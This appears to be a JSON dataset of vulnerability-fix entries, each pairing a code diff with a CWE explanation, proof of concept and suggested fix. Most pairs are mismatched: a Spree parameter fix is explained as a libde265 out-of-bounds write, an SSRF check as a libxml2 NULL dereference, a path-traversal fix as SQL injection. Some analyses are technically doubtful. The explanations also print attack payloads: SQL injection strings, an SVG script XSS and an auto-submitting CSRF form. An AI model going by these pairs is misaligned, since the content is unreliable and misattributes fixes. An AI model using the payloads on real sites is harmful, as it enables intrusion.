        "diff": "diff --git a/golden_patch_sql_injection.js b/golden_patch_sql_injection.js\nnew file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ b/golden_patch_sql_injection.js\n@@ -0,0 +1,30 @@\n+const express = require('express');\n+const mysql   = require('mysql');\n+const app     = express();\n+const port    = 3000;\n+\n+// Use a secure connection pool\n+const db = mysql.createPool({\n+  host: 'localhost',\n+  user: 'your_user',\n+  password: 'your_password',\n+  database: 'your_database'\n+});\n+\n+// Secure route using parameterized query\n+app.get('/user', (req, res) => {\n+  const username = req.query.username;\n+  const query    = 'SELECT * FROM users WHERE username = ?';\n+  db.query(query, [username], (err, result) => {\n+    if (err) {\n+      console.error('Database error:', err);\n+      return res.status(500).send('Internal Server Error');\n+    }\n+    res.json(result);\n+  });\n+});\n+\n+app.listen(port, () => {\n+  console.log(`Server is running on http://localhost:${port}`);\n+});\n",
        "explanation": "Vulnerability Type:\nCWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n\nProof of Concept:\nVulnerable Code Snippet: https://github.com/NestumMilo-isFezan/hotel-management/blob/main/app/auth/register-action.php line 5 to 30\n\n //STEP 1: Form data handling using mysqli_real_escape_string function to escape special characters for use in an SQL query,\n    if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {\n        $username = mysqli_real_escape_string($conn, $_POST['username']);\n        $email = mysqli_real_escape_string($conn, $_POST['email']);\n        $password = mysqli_real_escape_string($conn, $_POST['password']);\n        $confirmPwd = mysqli_real_escape_string($conn, $_POST['confirmPwd']);\n\n          //Validate pwd and confrimPwd\n        if ($password !== $confirmPwd) {\n            echo \"password not match\";\n            exit();\n        }\n    //STEP 2: Check if userEmail already exist\n        $sql = \"SELECT * FROM useracc WHERE email='$email' LIMIT 1\";\t\n        $result = mysqli_query($conn, $sql);\n        if (mysqli_num_rows($result) == 1) {\n            echo \"email exist\";\n            exit();\n        }\n        else {\n            // User does not exist, insert new user record, hash the password\t\t\n            $pwdHash = trim(password_hash($_POST['password'], PASSWORD_DEFAULT)); \n            //echo $pwdHash;\n            $sql = \"INSERT INTO useracc (username, email, password ) VALUES ('$username','$email', '$pwdHash')\";\n            $insertOK=0;\n        }\n\nStep-by-Step Explanation:\n\n1) Input is taken directly from the user via the POST request.\n\n2) It is concatenated directly into an SQL query string without validation or sanitization.\n\n3) When a malicious input like ' OR '1'='1 is submitted, it alters the logic of the query.\n\n4) This allows attackers to bypass logic checks or access unauthorized records.\n\nSeverity:\nHigh \u2013 It allows full bypass of authentication or unauthorized access to sensitive data.\n\nRoot Cause:\nUser input is embedded directly into SQL queries without proper escaping or use of prepared statements, making the database vulnerable to injection attacks.\n\nExploit Scenario:\nAn attacker inputs ' OR '1'='1 into a login or data access form field. The query becomes always true, granting access or altering database records without proper authorization.\n\nWhy It Happens:\nThe application dynamically constructs SQL queries with unsanitized user input. Lack of input validation and absence of prepared statements leads to this issue.\n\nSecurity Implications:\nAn attacker can bypass login authentication, retrieve all database records, delete or alter data, or even gain admin access, causing severe data breaches or system compromise.\n\nSuggested Fix:\nUse parameterized queries (prepared statements) instead of directly inserting user inputs. Also implement input validation, escaping, and web application firewalls to prevent SQL injection.\n\nAffected Pages -\n1) Possible SQL Injection vulnerability via user input in variable 'password'"
    },
    "21": {
        "diff": "diff --git a/app/views/spree/admin/orders/index.html.erb b/app/views/spree/admin/orders/index.html.erb\nindex 9a4b1f3..b35b8cd 100644\n--- a/app/views/spree/admin/orders/index.html.erb\n+++ b/app/views/spree/admin/orders/index.html.erb\n@@ -1,6 +1,19 @@\n <% if controller_name == 'orders' %>\n+  <%# Safely permit only expected query parameters %>\n+  <% safe_params = params.permit(q: [\n+    :shipment_state_eq,\n+    :shipment_state_not_in,\n+    :state_eq,\n+    :state_in,\n+    :refunded,\n+    :partially_refunded\n+  ]).to_h %>\n\n   <div class=\"dropdown h-100 mr-2\">\n     <button class=\"btn btn-light h-100 dropdown-toggle\" type=\"button\" data-toggle=\"dropdown\" aria-expanded=\"false\">\n       <span class=\"text-muted font-weight-normal mr-1\">\n         <%= Spree.t(:show) %>\n       </span>\n       <%= order_filter_dropdown_value %>\n     </button>\n     <div class=\"dropdown-menu dropdown-menu-right w-100\" style=\"min-width: 200px\">\n-      <%= active_link_to Spree.t('admin.orders.all_orders'), params.to_unsafe_h.deep_merge({q: {shipment_state_eq: '', shipment_state_not_in: '', state_eq: '', state_in: '', refunded: '', partially_refunded: '' }}), class: 'dropdown-item', active: (params[:q] || {}).values_at(*%w[payment_state_not_eq shipment_state_not_in shipment_state_eq state_eq state_in refunded partially_refunded] ).all?(&:blank?) %>\n+      <%= active_link_to Spree.t('admin.orders.all_orders'), safe_params.deep_merge({q: {shipment_state_eq: '', shipment_state_not_in: '', state_eq: '', state_in: '', refunded: '', partially_refunded: '' }}), class: 'dropdown-item', active: (params[:q] || {}).values_at(*%w[payment_state_not_eq shipment_state_not_in shipment_state_eq state_eq state_in refunded partially_refunded] ).all?(&:blank?) %>\n\n-      <%= link_to params.to_unsafe_h.deep_merge({q: {shipment_state_not_in: [:shipped, :canceled], shipment_state_eq: '', state_eq: '', state_in: '', refunded: '', partially_refunded: ''}}),\n+      <%= link_to safe_params.deep_merge({q: {shipment_state_not_in: [:shipped, :canceled], shipment_state_eq: '', state_eq: '', state_in: '', refunded: '', partially_refunded: ''}}),\n                   class: \"dropdown-item d-flex align-items-center justify-content-between #{'active' if params[:q][:shipment_state_not_in] == ['shipped', 'canceled']}\" do %>\n           <%= Spree.t('admin.orders.unfulfilled') %>\n           <% if ready_to_ship_orders_count&.positive? %>\n             <span class=\"badge badge-light ml-2\">\n               <%= ready_to_ship_orders_count %>\n             </span>\n           <% end %>\n       <% end %>\n\n-      <%= link_to Spree.t('admin.orders.fulfilled'),\n-        params.to_unsafe_h.deep_merge({q: {shipment_state_eq: :shipped, shipment_state_not_in: '', state_eq: '', state_in: '', refunded: '', partially_refunded: ''}}),\n+      <%= link_to Spree.t('admin.orders.fulfilled'),\n+        safe_params.deep_merge({q: {shipment_state_eq: :shipped, shipment_state_not_in: '', state_eq: '', state_in: '', refunded: '', partially_refunded: ''}}),\n         class: \"dropdown-item #{'active' if params[:q][:shipment_state_eq] == 'shipped'}\" %>\n\n-      <%= link_to Spree.t('admin.orders.canceled'),\n-        params.to_unsafe_h.deep_merge({q: {state_eq: nil, state_in: [:canceled, :partially_canceled], shipment_state_not_in: '', shipment_state_eq: '', refunded: '', partially_refunded: ''}}),\n+      <%= link_to Spree.t('admin.orders.canceled'),\n+        safe_params.deep_merge({q: {state_eq: nil, state_in: [:canceled, :partially_canceled], shipment_state_not_in: '', shipment_state_eq: '', refunded: '', partially_refunded: ''}}),\n         class: \"dropdown-item #{'active' if params[:q][:state_in] == ['canceled','partially_canceled']}\" %>\n\n-      <%= link_to Spree.t('admin.orders.refunded'),\n-        params.to_unsafe_h.deep_merge({q: {refunded: '1', shipment_state_not_in: '', shipment_state_eq: '', state_eq: '', state_in: '', partially_refunded: ''}}),\n+      <%= link_to Spree.t('admin.orders.refunded'),\n+        safe_params.deep_merge({q: {refunded: '1', shipment_state_not_in: '', shipment_state_eq: '', state_eq: '', state_in: '', partially_refunded: ''}}),\n         class: \"dropdown-item #{'active' if params.dig(:q, :refunded) && params[:q][:refunded].present?}\" %>\n\n-      <%= link_to Spree.t('admin.orders.partially_refunded'),\n-        params.to_unsafe_h.deep_merge({q: {partially_refunded: '1', shipment_state_not_in: '', shipment_state_eq: '', state_eq: '', state_in: '', refunded: '' }}),\n+      <%= link_to Spree.t('admin.orders.partially_refunded'),\n+        safe_params.deep_merge({q: {partially_refunded: '1', shipment_state_not_in: '', shipment_state_eq: '', state_eq: '', state_in: '', refunded: '' }}),\n         class: \"dropdown-item #{'active' if params.dig(:q, :partially_refunded) && params[:q][:partially_refunded].present?}\" %>\n     </div>\n   </div>\n <% end %>\n",
        "explanation": "Vulnerability Type: CWE-787: Out-of-bounds Write\n\nSeverity: Low (2)\n\nOWASP Category: A05:2021 \u2013 Security Misconfiguration\n\nRoot Cause: When compiling libde265 with Emscripten without sanitization, WebAssembly code can perform unchecked memory accesses. In this simulation, a JavaScript buffer is passed to a C++ function that writes beyond the fixed-size buffer's bounds.\n\nExploit Scenario: JavaScript sends a 64-byte input to a function that writes to a 16-byte C++ buffer without checking boundaries. This leads to memory corruption.\n\nWhy It Happens: The function does not validate the input length before copying data into the fixed buffer. Without sanitization, such bugs are not caught.\n\nSecurity Implications: May result in memory corruption or instability when processing malformed or large inputs.\n\nSuggested Fix: Introduce explicit bounds checks in C++ code. Also, compile with -fsanitize=address to catch similar issues during development."
    },
    "26": {
        "diff": "--- a/popup.js\n+++ b/popup.js\n@@ -1,9 +1,24 @@\n-document.getElementById('saveBtn').addEventListener('click', () => {\n-    const userData = {\n-      firstName: document.getElementById('firstName').value,\n-      lastName: document.getElementById('lastName').value,\n-      email: document.getElementById('email').value,\n-      phone: document.getElementById('phone').value\n-    };\n-\n-    chrome.storage.sync.set({ userData }, () => {\n-      alert('Data Saved!');\n-    });\n-  });\n+document.getElementById('saveBtn').addEventListener('click', () => {\n+  const sanitize = (str) => str.replace(/[<>\"']/g, '');\n+  const getInputValue = (id) => sanitize(document.getElementById(id)?.value || '');\n+\n+  const userData = {\n+    firstName: getInputValue('firstName'),\n+    lastName: getInputValue('lastName'),\n+    email: getInputValue('email'),\n+    phone: getInputValue('phone')\n+  };\n+\n+  if (!userData.email.includes('@')) {\n+    alert('Please enter a valid email.');\n+    return;\n+  }\n+\n+  chrome.storage.sync.set({ userData }, () => {\n+    alert('Data Saved!');\n+  });\n+});\n \n-document.getElementById('fillBtn').addEventListener('click', () => {\n-    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {\n-      chrome.scripting.executeScript({\n-        target: { tabId: tabs[0].id },\n-        files: ['content.js']\n-      });\n-    });\n-  });\n+document.getElementById('fillBtn').addEventListener('click', () => {\n+  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {\n+    if (!tabs || tabs.length === 0) {\n+      alert('No active tab found.');\n+      return;\n+    }\n+    chrome.scripting.executeScript({\n+      target: { tabId: tabs[0].id },\n+      files: ['content.js']\n+    }, (results) => {\n+      if (chrome.runtime.lastError) {\n+        console.error('Script injection failed:', chrome.runtime.lastError.message);\n+        alert('Failed to execute script.');\n+      }\n+    });\n+  });\n+});",
        "explanation": "Vulnerability Type:  \nCWE-434: Unrestricted Upload of File with Dangerous Type\n\nProof of Concept:\n\nconst isImage = uploadedFile.type.match(/image./);\nconst extension = path.extname(uploadedFile.name).toLowerCase();\n\nif (allowed.length > 0 && (!extension || extension === '.' || !allowed.includes(extension))) {\n\tthrow new Error(`[[error:invalid-file-type, ${allowed.join('&#44; ')}]]`);\n}\n\nconst isSVG = uploadedFile.type === 'image/svg+xml';\nif (isSVG || meta.config.resizeImageWidth === 0 || meta.config.resizeImageWidthThreshold === 0) {\n\treturn fileObj;\n}\n\n1.Client sends a file named `payload.svg`, sets `Content-Type: image/svg+xml`.\n2. Code uses MIME type and extension to allow file.\n3. SVG files are not resized or sanitized and are returned immediately.\n4. Uploaded SVG may contain malicious JavaScript (e.g., `<script>alert(1)</script>`).\n5. When the SVG is rendered on a page (e.g., profile image), it triggers stored XSS.\n6. The bug is easy to exploit by any authenticated user.\n7. Allows stored XSS, leading to session hijacking, account takeover, or privilege escalation.\n8. Affects all users who load the attacker\u2019s profile/post.\n\nSeverity:\n4 - High\n\nRoot Cause:\nThe upload handler trusts MIME type and file extension values provided by the client and does not validate the actual file contents via magic byte analysis. It also allows SVG files without proper sanitization, allowing malicious payloads to be uploaded and executed.\n\nExploit Scenario:\nAn attacker uploads an `.svg` file containing embedded JavaScript using a spoofed `Content-Type: image/svg+xml`. The application accepts the upload, stores the file, and later renders it on a page, resulting in automatic script execution in other users' browsers.\n\nWhy It Happens:\nThe server performs validation only on file extensions and MIME types provided by the user instead of verifying the file's true type using magic bytes or robust libraries. Additionally, it does not sanitize SVG files or block them entirely despite their inherent risk.\n\nSecurity Implications:\nAn attacker can achieve stored XSS, execute scripts in other users\u2019 sessions, steal cookies or JWTs, hijack admin sessions, or launch further attacks from a trusted context. The vulnerability affects all users who interact with uploaded content.\n\nSuggested Fix:\nValidate uploaded files using a magic-bytes detection library like `file-type` to ensure actual content matches expected image MIME types. Disallow SVG uploads or sanitize them thoroughly using a secure sanitizer. Reject all files that fail validation."
    },
    "19": {
        "diff": "diff --git a/middleware.ts b/middleware.ts\nindex abc1234..def5678 100644\n--- a/middleware.ts\n+++ b/middleware.ts\n@@\n import { NextResponse, type NextRequest } from \"next/server\";\n import NextAuth from \"next-auth\";\n import { authConfig } from \"./auth.config\";\n import { getBackendAddress } from \"@/lib/get-backend-address\";\n+\n+function isSafeUrl(url: string): boolean {\n+    try {\n+        const parsed = new URL(url);\n+        const disallowedHosts = [\"localhost\", \"127.0.0.1\", \"169.254.169.254\"];\n+        if (disallowedHosts.includes(parsed.hostname)) return false;\n+        return true;\n+    } catch {\n+        return false;\n+    }\n+}\n\n const { auth } = NextAuth(authConfig);\n\n export default auth(async (request: NextRequest) => {\n     const requestHeaders = request.headers;\n-    const backend = getBackendAddress(requestHeaders);\n+    const backend = getBackendAddress(requestHeaders);\n+\n+    if (!isSafeUrl(`${backend}/verify-domain`)) {\n+        return Response.json({ success: false, error: \"Unsafe backend URL\" }, { status: 400 });\n+    }\n\n     if (request.nextUrl.pathname === \"/healthy\") {\n         return Response.json({ success: true });\n     }\n\n     try {\n         const response = await fetch(`${backend}/verify-domain`);\n\n         if (!response.ok) {\n             throw new Error();\n         }\n\n         const resp = await response.json();\n\n         requestHeaders.set(\"domain\", resp.domain);\n\n         if (request.nextUrl.pathname === \"/favicon.ico\") {\n             try {\n-                if (resp.logo) {\n-                    const response = await fetch(resp.logo);\n-                    if (response.ok) {\n-                        const blob = await response.blob();\n-                        return new NextResponse(blob, {\n-                            headers: {\n-                                \"content-type\": \"image/webp\",\n-                            },\n-                        });\n-                    } else {\n-                        return NextResponse.rewrite(\n-                            new URL(`/default-f\n",
        "explanation": "The vulnerability is located in the function `xmlXPathNodeEval()` inside the `xpath.c` file in the libxml2 repository.\n\nSpecifically:\n- The function calls `xmlXPathNewContext(doc)` without checking if the returned pointer (`ctxt`) is NULL.\n- Immediately after allocation, `ctxt->node = node;` is executed without a NULL check, causing a potential NULL dereference if allocation failed.\n\nTo find the vulnerable code:\n1. Open `xpath.c`.\n2. Locate the function `xmlXPathNodeEval()`.\n3. Observe the lack of a NULL check after `xmlXPathNewContext(doc)`.\n\nSuggested Fix:\n- Insert a check: `if (ctxt == NULL) return NULL;` immediately after the call to `xmlXPathNewContext(doc)` before accessing `ctxt->node`.\n\nThis issue can be triggered when parsing malformed XML or under low-memory conditions, potentially leading to a crash (denial-of-service).\n\nVulnerability Type: CWE-476: NULL Pointer Dereference\n\nProof of Concept:\nIn the function vulnerable_xpath_eval, if xmlXPathNewContext(doc) returns NULL due to a malformed document or low memory condition, the program dereferences ctxt without checking, leading to a NULL pointer dereference crash.\n\nOWASP Top 10 category:\nA5:2017 \u2013 Broken Access Control (leading to Denial of Service)\n\nSeverity:\n4 - High\n\nRoot Cause:\nThe application fails to validate the result of xmlXPathNewContext() before dereferencing it, assuming allocation and context creation always succeed.\n\nExploit Scenario:\nAn attacker supplies a crafted or malformed XML file that causes xmlXPathNewContext() to fail, resulting in a crash when the application attempts to access ctxt->node.\n\nWhy It Happens:\nMissing NULL checks after critical allocation functions, trusting external input without verification.\n\nSecurity Implications:\nRemote attackers could cause denial-of-service by forcing crashes in XML parsing systems that rely on libxml2.\n\nSuggested Fix:\nCheck if xmlXPathNewContext() returns NULL before accessing the context object. Safely handle allocation failures.\n\nSecurity Hardening Suggestion:\nIn addition to fixing the immediate NULL dereference in `xmlXPathNodeEval()`, I recommend introducing a standardized macro or wrapper function inside libxml2 for all future memory allocations or context creations.\n\nExample:\n#define SAFE_ALLOC_CHECK(ptr) if ((ptr) == NULL) return NULL;\n\nThis would enforce a consistent, project-wide policy where every allocation or new object creation must be immediately checked, reducing the likelihood of future NULL dereference vulnerabilities.\n\nStandardizing defensive programming practices like this could improve libxml2\u2019s overall resilience against memory exhaustion and malformed input scenarios across its parsing modules (parser.c, tree.c, xpath.c, etc.).\n"
    },
    "45": {
        "diff": "--- class-llms-media-protector.php\t2025-04-25 00:00:00.000000000 +0000\n+++ class-llms-media-protector.php\t2025-04-25 00:00:00.000000000 +0000\n@@ -210,7 +210,17 @@\n-    $result = readfile( filename: $file_name ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_read_readfile\n+    // Define base directory for allowed files\n+    $base_dir = __DIR__ . '/protected-media/';\n+    $real_path = realpath($base_dir . $file_name);\n+\n+    // Ensure file is within the base directory\n+    if ($real_path !== false && str_starts_with($real_path, $base_dir)) {\n+        $result = readfile($real_path);\n+    } else {\n+        http_response_code(403);\n+        echo \"Access denied.\";\n+        exit;\n+    }\n",
        "explanation": "The SQL query in the /search-transactionRecord route improperly uses the variable UID inside subqueries without parameterization, leading to SQL injection risk.\n\nPOC:\nAn attacker can craft a malicious UID parameter containing SQL code to manipulate the query, e.g., sending UID = \"1 OR 1=1\" could cause the query to return all transaction records.\n\nRoot Cause:\nAt line 651 in app.py:\n\n@app.route(\"/search-transactionRecord\", methods=['POST'])\ndef search_transactionRecord():\n    UID = request.form['UID']\n    db = get_db()\n    rst = db.cursor().execute(\n        '''\n        with Shop_Name(TID, S_name) as (\n                select TID, S_name \n                from Transaction_Record left join Stores\n                on T_Object = S_owner\n            ),\n            Subj_Name(TID, Subj_name) as (\n                select TID, U_name as Subj_name\n                from Transaction_Record, Users\n                where T_Subject = UID\n            ),\n            Obj_Name(TID, Obj_name) as (\n                select TID, U_name as Obj_name\n                from Transaction_Record, Users\n                where T_Object = UID\n            )\n        select TID, \n            case \n                when T_action = 2 then 'Recharge'\n                when T_action = 1 then 'Recieve'\n                when T_action = 0 then 'Payment'\n            end as Action, \n            strftime('%Y/%m/%d %H:%M', T_time) as Time,\n            case\n                when T_action = 2 then Subj_name\n                when T_action = 1 and is_refund = 0 then Obj_name\n                when T_action = 1 and is_refund = 1 then S_name\n                when T_action = 0 and is_refund = 0 then S_name\n                when T_action = 0 and is_refund = 1 then Obj_name\n            end as Trader,\n            T_amount\n        from Transaction_Record natural join Subj_Name natural join Obj_Name natural join Shop_Name\n        where T_Subject = ?\n        ''', (UID,)\n    ).fetchall()\n    transaction = [{'TID': TID, 'Action': Action, 'Time': Time, 'Trader': Trader, 'T_amount': T_amount}\n                   for TID, Action, Time, Trader, T_amount in rst]\n    table = {'tableRow': transaction}\n    print(table['tableRow'])\n    response = jsonify(table)\n    response.headers.add('Access-Control-Allow-Origin', '*')\n    response.status_code = 200\n    return response\n\n\nThe subqueries use UID directly inside SQL without parameterization, which is vulnerable.\n\nExploit Scenario:\nAn attacker submits a crafted UID value containing SQL code in the POST request to /search-transactionRecord. This can lead to unauthorized data exposure or manipulation.\n\nWhy it Happens:\nThe UID variable is interpolated in subqueries without parameter binding. SQLite does not automatically replace UID inside subqueries with the parameter value, causing the SQL engine to treat it as a column or literal, enabling injection.\n\nSecurity Implications:\nData leakage of sensitive transaction records and potential unauthorized access or modification of data.\n\nSuggested Fix:\n1. Parameterized Queries in Subqueries:\nThe subqueries Subj_Name and Obj_Name were directly embedding UID in the WHERE clause, leading to SQL injection. By using parameterized queries in subqueries by joining Transaction_Record with Users on T_Subject = Users.UID and T_Object = Users.UID respectively and added WHERE Users.UID = ? with UID passed as a parameter.\n\n2.Multiple Parameters:\nBecause the UID is now used multiple times in the overall query (once in each of the Subj_Name and Obj_Name CTEs, and once in the final WHERE clause), you must pass it as a parameter multiple times in the execute() method.\n\nFixed Code: \n@app.route(\"/search-transactionRecord\", methods=['POST'])\ndef search_transactionRecord():\n    UID = request.form['UID']\n    db = get_db()\n    rst = db.cursor().execute(\n        '''\n        WITH Shop_Name(TID, S_name) AS (\n            SELECT TID, S_name\n            FROM Transaction_Record LEFT JOIN Stores\n            ON T_Object = S_owner\n        ),\n        Subj_Name(TID, Subj_name) AS (\n            SELECT TID, U_name AS Subj_name\n            FROM Transaction_Record\n            INNER JOIN Users ON Transaction_Record.T_Subject = Users.UID\n            WHERE Users.UID = ?\n        ),\n        Obj_Name(TID, Obj_name) AS (\n            SELECT TID, U_name AS Obj_name\n            FROM Transaction_Record\n            INNER JOIN Users ON Transaction_Record.T_Object = Users.UID\n            WHERE Users.UID = ?\n        )\n        SELECT TID,\n            CASE\n                WHEN T_action = 2 THEN 'Recharge'\n                WHEN T_action = 1 THEN 'Recieve'\n                WHEN T_action = 0 THEN 'Payment'\n            END AS Action,\n            strftime('%Y/%m/%d %H:%M', T_time) AS Time,\n            CASE\n                WHEN T_action = 2 THEN Subj_name\n                WHEN T_action = 1 AND is_refund = 0 THEN Obj_name\n                WHEN T_action = 1 AND is_refund = 1 THEN S_name\n                WHEN T_action = 0 AND is_refund = 0 THEN S_name\n                WHEN T_action = 0 AND is_refund = 1 THEN Obj_name\n            END AS Trader,\n            T_amount\n        FROM Transaction_Record\n        NATURAL JOIN Subj_Name\n        NATURAL JOIN Obj_Name\n        NATURAL JOIN Shop_Name\n        WHERE T_Subject = ?\n        ''', (UID, UID, UID)  # Pass UID as parameter to each subquery\n    ).fetchall()\n    transaction = [{'TID': TID, 'Action': Action, 'Time': Time, 'Trader': Trader, 'T_amount': T_amount}\n                   for TID, Action, Time, Trader, T_amount in rst]\n    table = {'tableRow': transaction}\n    print(table['tableRow'])\n    response = jsonify(table)\n    response.headers.add('Access-Control-Allow-Origin', '*')\n    response.status_code = 200\n    return response\n"
    },
    "89": {
        "diff": "--- bankistApp.js\n+++ bankistApp.js\n@@ const displayMovements = function (acc, sort = false) {\n   movs.forEach(function (mov, i) {\n     const type = mov > 0 ? 'deposit' : 'withdrawal';\n\n     const date = new Date(acc.movementsDates[i]);\n     const displayDate = formatMovementDate(date, acc.locale);\n\n     const formattedMov = formatCur(mov, acc.locale, acc.currency);\n\n-    const html = `\n-      <div class=\"movements__row\">\n-        <div class=\"movements__type movements__type--${type}\">${i + 1} ${type}</div>\n-        <div class=\"movements__date\">${displayDate}</div>\n-        <div class=\"movements__value\">${formattedMov}</div>\n-      </div>\n-    `;\n-\n-    containerMovements.insertAdjacentHTML('afterbegin', html);\n+    const htmlElement = document.createElement('div');\n+    htmlElement.classList.add('movements__row');\n+    htmlElement.innerHTML = `\n+      <div class=\"movements__type movements__type--${type}\">${i + 1} ${type}</div>\n+      <div class=\"movements__date\">${displayDate}</div>\n+      <div class=\"movements__value\">${formattedMov}</div>\n+    `;\n+    containerMovements.prepend(htmlElement);\n   });\n };\n",
        "explanation": "Vulnerability Type:\nCWE-352: Cross-Site Request Forgery (CSRF)\n\nThis vulnerability arises when a web application allows state-changing operations to be performed without verifying that the request is intentionally initiated by the user. Without CSRF tokens, malicious third-party sites can trick authenticated users into executing unwanted actions unknowingly.\n\nProof of Concept:\nIn the current Express application, after body parsing middleware (express.json, express.urlencoded) and CORS setup, there is no CSRF protection implemented.\nExample:\n\napp.use(cors(corsOption));\napp.use('/api/user/', userRoute);\nIncoming POST/PUT/DELETE requests are processed without validating their origin.\n\nMalicious sites could exploit this to perform unauthorized operations through an authenticated user's session.\n\nThus, an attacker can forge cross-site requests.\n\nSeverity:\nHIGH\n\nThe lack of CSRF protection leaves sensitive POST/PUT/DELETE routes vulnerable to unauthorized actions triggered from external websites.\nDepending on the functionalities exposed under /api/user/, exploitation could result in data modification, account misuse, or administrative actions.\n\nRoot Cause:\nThe root cause is the absence of CSRF protection middleware (csurf or similar).\nWhen building web applications, especially RESTful APIs dealing with authenticated sessions or cookies, CSRF tokens are necessary to verify that each state-changing request is genuine and intentional.\n\nThe system fails to add this essential protection layer.\n\nExploit Scenario:\nSuppose a user is logged into the application.\nAn attacker could build a hidden HTML form that automatically submits a POST request to /api/user/sensitiveAction on behalf of the user without their consent.\n\nExample:\n\n<form action=\"https://yourapp.com/api/user/updateProfile\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\" />\n</form>\n<script>document.forms[0].submit();</script>\nWhen the user visits a malicious page, their session cookie is used to authorize the unintended request.\n\nWhy It Happens:\nThis vulnerability occurs because the application does not verify incoming state-changing requests using unique CSRF tokens.\nThe server blindly trusts the requests based solely on session authentication, without validating that the requests originate from the actual website interface or an authenticated user interaction.\n\nSecurity Implications:\nA successful CSRF attack could result in:\n\nUnauthorized changes to user profiles.\n\nMalicious fund transfers.\n\nUnwanted account deletions.\n\nFull control of critical operations under the compromised session. It risks data integrity, privacy, and platform trust, with potential regulatory and legal consequences (e.g., GDPR violation penalties).\n\nSuggested Fix:\nApply CSRF protection middleware (csurf) to the Express app:\n\nAdd csurf after session and body parsing middleware.\n\nGenerate a CSRF token for each session or request.\n\nRequire the token to be submitted with every POST, PUT, PATCH, or DELETE request."
    },
    "42": {
        "diff": "import RecoveryUpdate from '../model/recovery.model.js';\nimport mongoose from 'mongoose';\nimport Joi from 'joi';\n\n// Middleware to validate input\nconst validateRecoveryUpdateInput = (data) => {\n  const schema = Joi.object({\n    patientId: Joi.string().required(),\n    title: Joi.string().max(255).required(),\n    description: Joi.string().allow(null, '').max(500),\n    images: Joi.array().items(Joi.string().uri()),\n    videos: Joi.array().items(Joi.string().uri()),\n  });\n  return schema.validate(data);\n};\n\n// Secure create/edit recovery update\nexport const createEditRecoveryUpdate = async (req, res) => {\n  try {\n    const { error } = validateRecoveryUpdateInput(req.body);\n    if (error) {\n      return res.status(400).json({ message: error.details[0].message });\n    }\n\n    const { patientId, title, description, images, videos } = req.body;\n\n    if (!mongoose.Types.ObjectId.isValid(patientId)) {\n      return res.status(400).json({ message: 'Invalid patient ID' });\n    }\n\n    const existingUpdate = await RecoveryUpdate.findOne({ patientId });\n\n    if (existingUpdate) {\n      // Update existing record\n      const updatedRecoveryUpdate = await RecoveryUpdate.findByIdAndUpdate(\n        existingUpdate._id,\n        { title, description, images, videos },\n        { new: true }\n      );\n      return res.status(200).json(updatedRecoveryUpdate);\n    } else {\n      // Create new record\n      const newRecoveryUpdate = new RecoveryUpdate({\n        patientId,\n        title,\n        description,\n        images,\n        videos,\n      });\n\n      const savedUpdate = await newRecoveryUpdate.save();\n      return res.status(201).json(savedUpdate);\n    }\n  } catch (error) {\n    console.error(error);\n    res.status(500).json({ message: 'Internal server error' });\n  }\n};\n\n// Secure get single recovery update\nexport const getSingleRecoveryUpdate = async (req, res) => {\n  try {\n    const { id } = req.params;\n\n    if (!mongoose.Types.ObjectId.isValid(id)) {\n      return res.status(400).json({ message: 'Invalid recovery update ID' });\n    }\n\n    const recoveryUpdate = await RecoveryUpdate.findOne({ patientId: id });\n\n    if (!recoveryUpdate) {\n      return res.status(404).json({ message: 'Recovery update not found' });\n    }\n\n    res.status(200).json(recoveryUpdate);\n  } catch (error) {\n    console.error(error);\n    res.status(500).json({ message: 'Internal server error' });\n  }\n};\n",
        "explanation": "Vulnerability Type: CWE-176 (Improper Handling of Unicode Encoding)\n\nProof of Concept:\n\nThe variables like `input_decoding` and `default_codepage` were implicitly hardcoded, relying on ASCII/UTF-8 without make use of their configuration file but setting the variables between `dbf/__init__.py` and `dbf/tables.py`.\n\nconfig.py\n```python\n## treat non-unicode data as ...\ninput_decoding = 'utf-8'\n\n## if no codepage specified on dbf creation, use this\ndefault_codepage = 'ascii'\n\n## default format if none specified\ndefault_type = 'db3'\n\ntemp_dir = os.environ.get(\"DBF_TEMP\") or os.environ.get(\"TMP\") or os.environ.get(\"TEMP\") or \"\"\n```\n\ndbf/tables.py\n```python\ntemp_dir = os.environ.get(\"DBF_TEMP\") or os.environ.get(\"TMP\") or os.environ.get(\"TEMP\") or \"\"\n# more code...\n\ncode_pages = {\n        0x00 : ('ascii', \"plain ol' ascii\"),\n        # more code...\n        }\n\ndbf.default_codepage = default_codepage =  code_pages.get(0x00)[0]\n```\n\ndbf/__init__.py\n```python\nversion = 0, 99, 11, 1\n# Python 2 code may need to change these\ndefault_codepage = None     # will be set by tables module (defaults to ascii)\ndefault_type = 'db3'        # lowest common denominator\ninput_decoding = 'ascii'\n```\n\nThis can lead to reading and writing problems, depending on the type of information handled by the files (e.g. UTF-8 or CP1252). It is also an unfavorable design as it makes project management more difficult over time.\n\nSeverity: 1- Very Low\n\nRoot Cause: The original design scattered configuration settings (such as `default_codepage`) throughout the library. This made it difficult to manage and update these settings consistently, and it also created a dependency on hardcoded values between different files, making it harder to adapt the library in the time.\n\nExploit Scenario: When a user opens a DBF file with a different format from the default encoding, the library fails to properly read the text data, leading to `UnicodeEncodeError` or `UnicodeDecodeError`. This occurs with increased likelihood if a default is relied upon instead of detecting encoding per file, and making this behavior configurable.\n\nWhy It Happens: The vulnerability occurred due to a reliance on hardcoded values. It also had architectural issues because configuration wasn't centralized.\n\nSecurity Implications: While not a direct security breach, the improved modularity and centralized configuration makes it easier to review the code, and lowers the likelihood of future improper configuration errors.\n\nSuggested Fix:\n\n1. Centralize configuration in `config.py`:\n\nconfig.py\n```python\ndiff --git a/config.py b/config.py\nindex 1f01a41..32edf0a 100644\n--- a/config.py\n+++ b/config.py\n@@ -1,14 +1,25 @@\n+import locale\n+import os\n+\n # configuration flags\n\n ## Flag for behavior if bad data is encountered in a logical field\n ## Return None if True, else raise BadDataError\n LOGICAL_BAD_IS_NONE = True\n\n+version = 0, 99, 11, 1\n+\n+try:\n+    system_encoding = locale.getpreferredencoding(False)\n+    system_encoding = system_encoding.lower().replace('-', '')\n+except locale.Error:\n+    system_encoding = 'ascii'\n+\n ## treat non-unicode data as ...\n-input_decoding = 'utf-8'\n+input_decoding = system_encoding\n\n ## if no codepage 